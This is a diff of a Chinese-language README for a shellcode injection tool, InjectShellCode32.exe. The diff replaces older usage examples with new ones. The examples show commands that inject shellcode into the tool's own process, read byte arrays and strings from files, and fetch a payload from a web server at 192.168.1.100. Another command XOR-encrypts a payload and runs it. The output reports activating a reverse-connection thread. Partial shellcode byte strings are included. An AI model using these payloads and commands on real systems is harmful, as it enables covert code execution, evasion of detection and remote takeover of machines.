@@ -161,46 +161,47 @@ InjectShellCode32.exe XorArray --path d://array.txt --passwd lyshark
 "\xf6\xe1\x15\x29\x43\x10\xbc\x96";
 ```
 
-
-
-
-
-
-
-
-
-**将攻击载荷注入自身反弹:** 将一段压缩过的shellcode注入到自身进程并反弹权限。
-```
-C:\Users\admin\Desktop> sc32.exe InjectSelfShell --shellcode fce88f0000006031d2648b52308b520c***
-```
-
-**注入字节数组到自身进程:** 由于字节数组无法直接命令行方式传递，所以只能在文件中获取并压缩解码反弹。
-```
-C:\Users\admin\Desktop> sc32.exe InjectArrayByte --path d://shellcode.txt
+ - 将攻击载荷注入到自身进程内
+```C
+InjectShellCode32.exe InjectSelfShell --shellcode fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...
 [+] 解码地址: 19db64
 ```
 
-**从文件中读入并注入:** 从文件中读入一段已经压缩过的shellcode并执行反弹。
-```
-C:\Users\admin\Desktop> sc32.exe FileInjectShell --path d://format.txt
+ - 将字节数组注入到自身进程内
+```C
+"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
+"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
+"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
+"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
+
+InjectShellCode32.exe InjectArrayByte --path d://shellcode.txt
+[+] 解码地址: 19df20
 ```
 
-**注入攻击载荷到远程进程:** 该功能主要用于将代码注入到远程进程中，此处参数已经规范化。
-```
-C:\Users\admin\Desktop> sc32.exe InjectProcShell --pid 17948 --shellcode fce88f0000****
+ - 将一行字符串注入到自身进程内
+```C
+fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...
+
+InjectShellCode32.exe FileInjectShell --path d://output_shellcode.txt
+[+] 解码地址: 19df20
 ```
 
-**从远程加载载荷并注入:** 从远程Web服务器上获取到需要注入的代码，远程服务器保存一行格式字符串即可。
-```
-C:\Users\admin\Desktop> sc32.exe InjectWebShell --address 127.0.0.1 --payload shellcode.raw
+ - 从远程Web服务器加载字符串并注入到自身进程内
+```C
+192.168.1.100:80/shellcode.raw
+fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...
+
+InjectWebShell --address 192.168.1.100 --payload shellcode.raw
 ```
 
-**直接运行加密的攻击载荷:** 加密模块可以直接运行被加密过后的shellcode并反弹，注入时需要传递解码密码。
-```
-C:\Users\admin\Desktop> sc32.exe EncodeInFile --path d://encode.txt --passwd lyshark
-```
+ - 直接注入加密后的攻击载荷到自身进程内
+```C
+InjectShellCode32.exe Xor --path d://output_shellcode.txt --passwd lyshark
+% &{{%ssssssuspr'quw{!vqps{z&v{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'sr 
 
-**加密注入远程进程反弹:** 直接注入加密后的代码到远程进程中，实现方式如上。
-```
-C:\Users\admin\Desktop> sc32.exe EncodePidInFile --pid 17480 --path d://encode.txt --passwd lyshark
+InjectShellCode32.exe EncodeInFile --path d://xor_shellcode.txt --passwd lyshark
+[+] 解码ShellCode字节 => 708 bytes
+[+] 格式化ShellCode字节地址 => 19df00
+[*] 激活当前反弹线程 => 2a60000
 ```
